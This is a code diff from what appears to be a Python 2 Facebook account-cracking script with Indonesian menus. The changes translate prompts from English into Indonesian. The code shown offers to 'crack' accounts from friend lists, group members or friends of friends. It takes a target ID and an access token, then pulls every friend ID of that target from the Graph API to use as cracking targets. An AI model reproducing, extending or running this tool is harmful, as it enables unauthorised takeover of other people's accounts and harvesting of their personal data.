@@ -543,7 +543,7 @@ def super():
     print 50 * '\x1b[1;97m\xe2\x95\x90'
     print '\x1b[1;37;40m1. Crack dari daftar Teman'
     print '\x1b[1;37;40m2. Crack dari member Grup'
-    print '\x1b[1;37;40m3. Crack dari teman dari teman'
+    print '\x1b[1;37;40m3. Crack teman dari teman'
     print '\x1b[1;31;40m0. Kembali'
     pilih_super()
 
@@ -588,17 +588,17 @@ def pilih_super():
 				if peak == '3':
 					os.system('reset')
 					print logo
-					idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID friend \x1b[1;91m: \x1b[1;97m')
+					idt = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID Teman \x1b[1;91m: \x1b[1;97m')
 					try:
 						r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
 						asw = json.loads(r.text)
-						print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + asw['name']
+						print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDari\x1b[1;91m :\x1b[1;97m ' + asw['name']
 					except KeyError:
-						print '\x1b[1;91m[!] Friend not found'
-						raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+						print '\x1b[1;91m[!] Teman tidak ditemukan'
+						raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali\x1b[1;91m]')
 						super()
 
-					jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mGet all id from friend \x1b[1;97m...')
+					jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMengambil ID dari teman \x1b[1;97m...')
 					r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
 					z = json.loads(r.text)
 					for i in z['data']:
